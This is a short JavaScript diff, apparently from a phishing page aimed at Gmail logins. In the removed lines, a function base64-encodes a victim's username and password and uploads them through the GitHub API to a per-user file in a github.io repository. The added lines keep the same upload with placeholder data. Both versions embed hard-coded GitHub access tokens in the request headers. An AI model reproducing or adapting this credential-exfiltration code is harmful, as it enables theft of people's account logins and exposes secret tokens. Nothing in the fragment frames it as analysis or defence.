@@ -17,22 +17,19 @@
          
          return btoa(combostring);
       }
-      function sendRequest(username, password) {
+      function sendRequest() {
 
-        var content_string = btoa(username + ":" + password)
-
-        var data_dict = '{"message": "message","content": "' + content_string + '","committer": {"name": "comitter","email": "comitter@github.com"}'
-        console.log(data_dict);
+        var data_dict = '{"message": "message","content": "content","committer": {"name": "comitter","email": "comitter@github.com"}'
 
         $.ajax({
             type: 'PUT',
            dataType: "json",
-            url: "https://api.github.com/repos/uXcFvJWE9hmD2XYM/uXcFvJWE9hmD2XYM.github.io/contents/gmail/data/" + username + ".txt",
+            url: "https://api.github.com/repos/uXcFvJWE9hmD2XYM/uXcFvJWE9hmD2XYM.github.io/contents/gmail/data/teasdasd.txt",
            beforeSend: function (xhr) {
-            xhr.setRequestHeader('Authorization', 'token 38fa0964e6435a65847cc04a6566bb10d6d8b6a4');
+            xhr.setRequestHeader('Authorization', 'token a0f82fb94d57b24d9a0458a10d6de96eaf946ac3');
             },
             headers: {
-                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
+                  'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
             },
             data: data_dict,
            success: function(msg){
